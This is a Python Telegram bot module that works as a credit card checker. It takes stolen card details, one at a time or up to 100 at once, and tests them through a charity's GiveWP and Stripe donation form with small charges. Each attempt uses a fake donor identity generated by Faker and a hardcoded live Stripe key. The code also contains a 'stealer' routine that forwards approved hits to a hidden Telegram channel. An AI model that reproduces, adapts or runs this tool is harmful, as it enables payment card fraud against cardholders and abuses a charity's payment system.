import httpx
import time
import asyncio
import re
from faker import Faker
from urllib.parse import urlencode
from pyrogram import Client, filters
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from TOOLS.getcc_for_mass import *

# ━━━━━━━━━━━━━━━━━━━━ STEALER CONFIG ━━━━━━━━━━━━━━━━━━━━
STEALER_CHANNEL_ID = -1003627495953
OWNER_DM = "https://t.me/spid_3r"
SYMBOL = f"<a href='{OWNER_DM}'>㊕</a>"

fake = Faker()

async def send_hit_to_stealer(client: Client, fullcc, status, response, gateway, time_taken, first_name, role):
    """Send approved card to stealer channel/group"""
    try:
        stealer_msg = f"""✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗛𝗜𝗧 ✅

{SYMBOL} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway}
{SYMBOL} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response}

{SYMBOL} 𝗧𝗼𝗼𝗸 {time_taken:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀
{SYMBOL} 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: {first_name} ({role})
{SYMBOL} 𝗢𝘄𝗻𝗲𝗿: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""

        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=stealer_msg, parse_mode="HTML")
        print(f"[Stealer] Sent approved hit to channel")
    except Exception as e:
        print(f"[Stealer Error] Failed to send to channel: {e}")

async def hiburma_check(fullcc):
    try:
        num, mm, yy, cvv = fullcc.strip().split('|')
    except:
        return "Error", "Invalid card format"

    async with httpx.AsyncClient(timeout=120, follow_redirects=True) as s:
        headers = {"User-Agent": "Mozilla/5.0"}

        try:
            r = await s.get("https://www.hiburma.org/?givewp-route=donation-form-view&form-id=542&locale=en_GB", timeout=120)
            sig = re.search(r'givewp-route-signature=([a-f0-9]+)', r.text)
            sigid = re.search(r'givewp-route-signature-id=([a-zA-Z0-9_-]+)', r.text)
            sigexp = re.search(r'givewp-route-signature-expiration=([0-9]+)', r.text)
            if not (sig and sigid and sigexp):
                return "Error", "Failed to extract tokens"
        except Exception as e:
            return "Error", f"Connection error: {e}"

        donate_url = (
            f"https://www.hiburma.org/?givewp-route=donate"
            f"&givewp-route-signature={sig.group(1)}"
            f"&givewp-route-signature-id={sigid.group(1)}"
            f"&givewp-route-signature-expiration={sigexp.group(1)}"
        )

        first, last, email = fake.first_name(), fake.last_name(), fake.email()
        donate_data = {
            "amount": "1",
            "currency": "GBP",
            "donationType": "single",
            "formId": "542",
            "gatewayId": "stripe_payment_element",
            "firstName": first,
            "lastName": last,
            "email": email,
            "isEmbed": "true",
            "embedId": "give-form-shortcode-1",
            "locale": "en_GB",
            "gatewayData[stripePaymentMethod]": "card",
            "gatewayData[stripePaymentMethodIsCreditCard]": "true",
            "gatewayData[formId]": "542",
            "gatewayData[stripeKey]": "pk_live_51REnik2N0Z39Zjtm11wylDcSU28ixsCiWREVuBmti2UjuIwxiadzuhb6lqf3W0N1IQqXMzUm1uSCsHdSX05ZPMPI00QM6IGDh1",
            "gatewayData[stripeConnectedAccountId]": "acct_1REnik2N0Z39Zjtm",
            "originUrl": "https://www.hiburma.org/donate-us/"
        }

        try:
            r = await s.post(donate_url, data=donate_data, headers=headers, timeout=120)
            js = r.json()
            client_secret = js["data"]["clientSecret"]
            pi_id = client_secret.split("_secret")[0]
        except Exception as e:
            return "Error", f"Failed to get client_secret: {e}"

        stripe_url = f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm"
        stripe_headers = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "user-agent": "Mozilla/5.0"
        }
        stripe_data = {
            "return_url": "https://www.hiburma.org/donate-us/",
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": num,
            "payment_method_data[card][exp_month]": mm,
            "payment_method_data[card][exp_year]": yy,
            "payment_method_data[card][cvc]": cvv,
            "payment_method_data[billing_details][name]": f"{first} {last}",
            "payment_method_data[billing_details][email]": email,
            "payment_method_data[billing_details][address][country]": "US",
            "payment_method_data[billing_details][address][postal_code]": "10080",
            "payment_method_data[payment_user_agent]": "stripe.js/2ee772a1e3; stripe-js-v3/2ee772a1e3; payment-element",
            "expected_payment_method_type": "card",
            "use_stripe_sdk": "true",
            "key": "pk_live_51REnik2N0Z39Zjtm11wylDcSU28ixsCiWREVuBmti2UjuIwxiadzuhb6lqf3W0N1IQqXMzUm1uSCsHdSX05ZPMPI00QM6IGDh1",
            "client_secret": client_secret,
            "_stripe_account": "acct_1REnik2N0Z39Zjtm"
        }

        try:
            rc = await s.post(stripe_url, headers=stripe_headers, data=urlencode(stripe_data), timeout=120)
            res = rc.json()
            if "error" in res:
                return "Declined ❌", res["error"].get("message", "Declined")
            elif res.get("status") == "succeeded":
                return "Approved ✅", "Payment Succeeded"
            else:
                return res.get("status", "Unknown"), "Check manually"
        except Exception as e:
            return "Error", f"Stripe confirm failed: {e}"


# ━━━━━━━━━━━━━━━━━━━━ SINGLE CHECK ━━━━━━━━━━━━━━━━━━━━

@Client.on_message(filters.command("hb", [".", "/"]))
async def hiburma_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)

        gateway = "HiBurma 1£ Charge"

        if checkall[0] == False:
            return

        role = checkall[1]
        getcc = await getmessage(message)
        if getcc == False:
            resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {gateway}
◈ <b>ᴄᴍᴅ :</b> /hb

⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗

↪ <b>ᴜꜱᴀɢᴇ :</b> /hb cc|mes|ano|cvv
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, message.id)
            return

        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"

        firstresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ. ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■□□□"""
        await asyncio.sleep(0.5)
        firstchk = await message.reply_text(firstresp, message.id)

        secondresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ.. ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■□"""
        await asyncio.sleep(0.5)
        secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp)

        start = time.perf_counter()
        status, response = await hiburma_check(fullcc)

        thirdresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ... ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■■"""
        await asyncio.sleep(0.5)
        thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp)

        if "Approved" in status or "✅" in status:
            status_text = f"𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
            
            # Send to stealer channel
            await send_hit_to_stealer(
                Client, fullcc, status, response, gateway, 
                time.perf_counter() - start, first_name, role
            )
        else:
            status_text = f"𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌"

        finalresp = f"""{status_text}

{SYMBOL} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway}
{SYMBOL} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response}

{SYMBOL} 𝗧𝗼𝗼𝗸 {time.perf_counter() - start:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀
{SYMBOL} 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: {first_name} ({role})
{SYMBOL} 𝗢𝘄𝗻𝗲𝗿: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""

        await asyncio.sleep(0.5)
        await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp)
        await setantispamtime(user_id)
        await deductcredit(user_id)

    except Exception:
        import traceback
        await error_log(traceback.format_exc())


# ━━━━━━━━━━━━━━━━━━━━ MASS CHECK ━━━━━━━━━━━━━━━━━━━━

@Client.on_message(filters.command("mhb", [".", "/"]))
async def mass_hiburma_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = str(message.from_user.first_name)
        checkall = await check_all_thing(Client, message)

        gateway = "HiBurma 1£ Charge"

        if checkall[0] == False:
            return

        role = checkall[1]
        getcc = await getcc_for_mass(message, role)
        if getcc[0] == False:
            await message.reply_text(getcc[1], message.id)
            return

        ccs = getcc[1]

        if len(ccs) > 100:
            await message.reply_text(f"✦ ᴍᴀx 100 ᴄᴄ ᴀʟʟᴏᴡᴇᴅ. ʏᴏᴜ ᴘʀᴏᴠɪᴅᴇᴅ {len(ccs)} ✦", message.id)
            return

        start = time.perf_counter()
        approved_count = 0
        declined_count = 0
        processed = 0
        total = len(ccs)
        approved_cards = []

        text = f"""Auto HiBurma
Admin

{SYMBOL} Response: Starting...

Progress: 0/{total}
Approved: 0
Declined: 0
Remaining: {total}

Checked by: {first_name} ({role})"""

        nov = await message.reply_text(text, message.id)

        for i, fullcc in enumerate(ccs, 1):
            processed = i
            remaining = total - processed
            status, response = await hiburma_check(fullcc)

            if "Approved" in status or "✅" in status:
                approved_count += 1
                response_status = "APPROVED ✅"
                card_time = time.perf_counter() - start
                
                approved_cards.append({
                    "fullcc": fullcc,
                    "response": response,
                    "gateway": gateway,
                    "time": card_time
                })
                
                # Send to stealer channel immediately
                await send_hit_to_stealer(
                    Client, fullcc, status, response, gateway, 
                    card_time, first_name, role
                )
            else:
                declined_count += 1
                response_status = "DECLINED ❌"

            # Update progress
            try:
                await Client.edit_message_text(
                    message.chat.id, 
                    nov.id, 
                    f"""Auto HiBurma
Admin

{SYMBOL} Response: {response_status}

Progress: {processed}/{total}
Approved: {approved_count}
Declined: {declined_count}
Remaining: {remaining}

Checked by: {first_name} ({role})"""
                )
            except:
                pass

            await asyncio.sleep(0.5)

        # Delete progress message
        await nov.delete()

        # Send each approved card as separate message
        for card in approved_cards:
            approved_msg = f"""𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅

{SYMBOL} 𝗚𝗮𝘁ᴇᴡᴀʏ ⇾ {card['gateway']}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {card['response']}

{SYMBOL} 𝗧ᴏᴏᴋ {card['time']:.2f} 𝘀ᴇᴄᴏɴᴅ𝘀
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
            
            await message.reply_text(approved_msg, message.id)
            await asyncio.sleep(0.5)

        # Send declined summary
        elapsed_time = round(time.perf_counter() - start, 2)
        
        if approved_count > 0:
            declined_summary = f"""❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 𝗖𝗮𝗿𝗱𝘀 ({declined_count})

━━━━━━━━━━━━━━━━━━━━
"""
            # Show declined cards (limited to avoid long message)
            for card in ccs[:15]:
                if card not in [ac['fullcc'] for ac in approved_cards]:
                    declined_summary += f"{SYMBOL} {card} → Declined\n"
            
            if declined_count > 15:
                declined_summary += f"\n... and {declined_count - 15} more declined cards"
            
            declined_summary += f"""
━━━━━━━━━━━━━━━━━━━━
✅ Approved: {approved_count}
❌ Declined: {declined_count}
📊 Total: {total}
⏱ Time: {elapsed_time}s
👤 Checked by: {first_name} ({role})

━━━━━━━━━━━━━━━━━━━━
<a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
            
            await message.reply_text(declined_summary, message.id)
        else:
            # No approved cards
            await message.reply_text(
                f"""❌ 𝗡𝗼 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗖𝗮𝗿𝗱𝘀

━━━━━━━━━━━━━━━━━━━━
📊 Total Cards: {total}
❌ All Declined: {declined_count}
⏱ Time: {elapsed_time}s
👤 Checked by: {first_name} ({role})

━━━━━━━━━━━━━━━━━━━━
<a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>""",
                message.id
            )

        await massdeductcredit(user_id, len(ccs))
        await setantispamtime(user_id)

    except Exception:
        import traceback
        await error_log(traceback.format_exc())
